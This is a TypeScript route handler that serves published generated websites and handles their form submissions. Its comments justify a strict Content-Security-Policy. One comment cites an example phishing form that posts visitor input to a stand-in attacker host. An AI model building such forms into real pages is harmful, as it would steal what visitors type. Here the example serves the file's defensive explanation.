import { db } from "@/lib/db";
import { applySeo, pageUrl, robotsTxt, siteBaseUrl, sitemapXml } from "@/lib/site-seo";
import { submitSiteForm } from "@/lib/site-forms";
import { siteHostAllowed } from "../site-host";

export const dynamic = "force-dynamic";

const MIME: Record<string, string> = {
  html: "text/html; charset=utf-8",
  css: "text/css; charset=utf-8",
  js: "text/javascript; charset=utf-8",
  map: "application/json",
  json: "application/json",
  svg: "image/svg+xml",
  txt: "text/plain; charset=utf-8",
  // xml is required for sitemap.xml — without it a sitemap served as
  // application/octet-stream is ignored by crawlers.
  xml: "application/xml; charset=utf-8",
  ico: "image/x-icon",
  png: "image/png",
  jpg: "image/jpeg",
  jpeg: "image/jpeg",
  webp: "image/webp",
  woff2: "font/woff2",
};

// Locks generated pages down to nothing but themselves — matches the "no
// external requests" contract the builder is prompted with, so a page that
// somehow got a remote script past the agent still can't execute it.
//
// The last three directives do NOT inherit from `default-src` — that is the
// whole reason they have to be written out. Without them the "no external
// requests" contract had a hole big enough to walk a phishing form through:
// `connect-src 'none'` stops fetch/XHR and stops nothing else, so
// `<form action="https://attacker.example">` submitted cross-origin and
// carried whatever a visitor typed.
//
//   form-action 'self' — the only POST a generated page may make is to its own
//     origin. Everything else — <form action="https://attacker.example">,
//     formaction= on a button — is refused by the browser before a byte leaves.
//     Contact CTAs of the tel:/mailto:/sms: kind are <a href> and form-action
//     does not touch them either way.
//
//     UNCHANGED BY FORM SUBMISSIONS, and that is the point. Generated sites can
//     now have working contact forms (lib/site-forms.ts, POST below), and this
//     directive did NOT have to be widened by a single character to allow it,
//     because `'self'` is the SITE's origin — https://<slug>.kodely.site — and
//     that origin is already us: proxy.ts rewrites every request on it into
//     this very route. So a form whose action is `/__forms/<name>` is a
//     same-origin POST that lands in the same handler that served the page.
//     Pointing the form at kodely.me instead would have been cross-origin and
//     would have meant adding an external origin to form-action on every
//     customer site on the platform — a real loosening, for nothing.
//
//     Note what is still refused: a page may POST to its own origin and to
//     nowhere else, and only the paths this route answers do anything. The
//     phishing shape this directive was added for (a generated page collecting
//     what a visitor types and shipping it to an attacker) is exactly as
//     impossible as it was before.
//
//     `connect-src 'none'` is untouched and must stay that way. A form POST is
//     a navigation, not a scripted request, so nothing here needs it — which is
//     also why the submission endpoint answers with HTML rather than JSON.
//   base-uri 'none' — an injected <base href> would silently repoint every
//     relative URL on the page, which is a way to smuggle a remote origin back
//     in past the directives above.
//   object-src 'none' — plugin content has no use on a static generated page,
//     and it does not fall back to default-src either.
//
// MUST STAY IN SYNC with the copy in app/api/preview/[id]/[[...path]]/route.ts,
// which serves the same generated markup to the editor's iframe. It is a
// separate constant in a separate file on purpose (that route is owner-only
// and has its own MIME table); there is no shared module for the two.
const SANDBOX_CSP =
  "default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; frame-ancestors 'self'; form-action 'self'; base-uri 'none'; object-src 'none'";

/**
 * Which stored build file answers a requested URL path.
 *
 * Generated sites are multi-page (lib/foundation.ts): `vite build` emits a real
 * document per page — index.html, about.html, blog/index.html — and visitors
 * ask for /about, not /about.html. This is the whole server-side cost of that.
 *
 * Deliberately NOT the SPA catch-all ("serve index.html for anything unknown").
 * That shape is what a client-side router needs, and it turns every typo, every
 * dead inbound link and every stale crawl URL into a 200 serving the home page —
 * soft 404s, which Google treats as a quality problem on the whole site. Here a
 * path resolves only to a file that actually exists under one of two well-known
 * spellings, and everything else still 404s exactly as it did before.
 *
 * Anything carrying an extension resolves to itself and nothing else, which is
 * what keeps robots.txt, sitemap.xml and /assets/* on their existing single
 * path — no candidate list can shadow them.
 */
function candidatePaths(filePath: string): string[] {
  if (/\.[A-Za-z0-9]+$/.test(filePath)) return [filePath];
  const clean = filePath.replace(/\/+$/, "");
  if (!clean) return ["index.html"];
  // Order matters: about.html wins over about/index.html when a site has both.
  return [`${clean}.html`, `${clean}/index.html`];
}

/**
 * Form submissions from a published site: `POST /__forms/<formName>`, which
 * arrives here as `/api/site/<slug>/__forms/<formName>` via proxy.ts.
 *
 * Everything — host check, published check, caps, abuse control, storage and
 * the owner notification — is in lib/site-forms.ts. Anything that is not that
 * exact path shape is a 404 there, so this does not become a general POST
 * surface on the sites domain.
 */
export async function POST(
  req: Request,
  { params }: { params: Promise<{ slug: string; path?: string[] }> },
) {
  const { slug, path } = await params;
  return submitSiteForm(req, slug, path ?? []);
}

export async function GET(
  req: Request,
  { params }: { params: Promise<{ slug: string; path?: string[] }> },
) {
  const { slug, path } = await params;
  const filePath = path && path.length > 0 ? path.join("/") : "index.html";

  // Generated pages are only ever first-party to the sites domain. proxy.ts
  // turns this request away earlier for the same reason, but a route handler
  // must not depend on that: the proxy's own matcher can miss paths, and the
  // proxy is explicit (see its header comment) that it is never the only gate.
  //
  // The response is byte-identical to the "no such site" 404 below, so it does
  // not confirm that a slug exists to someone probing the wrong host.
  if (!siteHostAllowed(req.headers.get("host") ?? "", slug)) {
    return new Response("Site not found.", { status: 404 });
  }

  const project = await db.project.findUnique({ where: { slug } });
  if (!project || !project.publishedAt) {
    return new Response("Site not found.", { status: 404 });
  }

  const baseUrl = siteBaseUrl(req, slug);
  const seoHeaders = {
    "Content-Security-Policy": SANDBOX_CSP,
    "Cache-Control": "public, max-age=60",
  };

  // robots.txt and sitemap.xml are generated, not stored — they depend on the
  // visitor-facing host (which differs between the branded subdomain and the
  // staging path form), so a file baked at build time would be wrong on one of
  // them. A site that ships its own copy still wins: we only synthesise these
  // when the project has no such file.
  if (filePath === "robots.txt" || filePath === "sitemap.xml") {
    const own = await db.projectFile.findFirst({
      where: { projectId: project.id, path: filePath, published: true, kind: "build" },
    });
    if (!own) {
      if (filePath === "robots.txt") {
        return new Response(robotsTxt(baseUrl), {
          headers: { ...seoHeaders, "Content-Type": MIME.txt },
        });
      }
      const pages = await db.projectFile.findMany({
        where: { projectId: project.id, published: true, kind: "build", path: { endsWith: ".html" } },
        select: { path: true },
      });
      return new Response(
        sitemapXml(baseUrl, pages.map((p) => p.path), project.publishedAt ?? undefined),
        { headers: { ...seoHeaders, "Content-Type": MIME.xml } },
      );
    }
  }

  // One query for both spellings of a page, then the caller's preference order
  // decides — /about must not cost two round trips to answer.
  const candidates = candidatePaths(filePath);
  const matches = await db.projectFile.findMany({
    where: { projectId: project.id, path: { in: candidates }, published: true, kind: "build" },
  });
  const file = candidates.map((c) => matches.find((m) => m.path === c)).find(Boolean);
  if (!file) {
    return new Response("Not found.", { status: 404 });
  }

  const ext = file.path.split(".").pop() ?? "";

  // Backstop so no site can ship with the foundation's placeholder <title>.
  // Only fills gaps — anything the builder wrote itself is preserved.
  //
  // pageUrl(), not baseUrl: canonical and og:url must name THIS page. Keyed off
  // the file that actually answered, so /about and /about.html both canonicalise
  // to /about and Google sees one page rather than two competing duplicates.
  const body =
    ext === "html"
      ? applySeo(file.content, {
          projectName: project.name,
          baseUrl,
          pageUrl: pageUrl(baseUrl, file.path),
        })
      : file.content;

  return new Response(body, {
    headers: { ...seoHeaders, "Content-Type": MIME[ext] ?? "application/octet-stream" },
  });
}
